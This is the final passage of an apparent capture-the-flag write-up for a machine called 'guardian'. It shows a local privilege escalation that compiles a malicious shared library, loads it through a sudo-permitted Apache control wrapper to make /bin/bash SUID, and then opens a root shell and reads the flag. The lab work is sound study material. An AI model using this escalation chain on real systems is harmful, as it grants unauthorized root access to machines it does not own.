mark@guardian:~$ gcc -shared -fPIC -o /home/mark/confs/exploit.so /home/mark/exploit.c
```

Now, we are ready let's execute the sudo command.

```bash
mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf
apache2: Syntax error on line 1 of /home/mark/confs/exploit.conf: Can't locate API module structure `exploit_module' in file /home/mark/confs/evil.so: /home/mark/confs/exploit.so: undefined symbol: exploit_module
Action '-f /home/mark/confs/exploit.conf' failed.
The Apache error log may have more information.
```

Ignore this error, our code has already been executed, check if the /bin/bash has become SUID.

```bash
mark@guardian:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Yay, we can now finally become root.

```bash
mark@guardian:~$ /bin/bash -p
bash-5.1# id
uid=1001(mark) gid=1001(mark) euid=0(root) egid=0(root) groups=0(root),1001(mark),1002(admins)
```

Let's conclude this very long challenge by reading the final flag at root directory.

```bash
bash-5.1# cat root.txt
72.....52
```



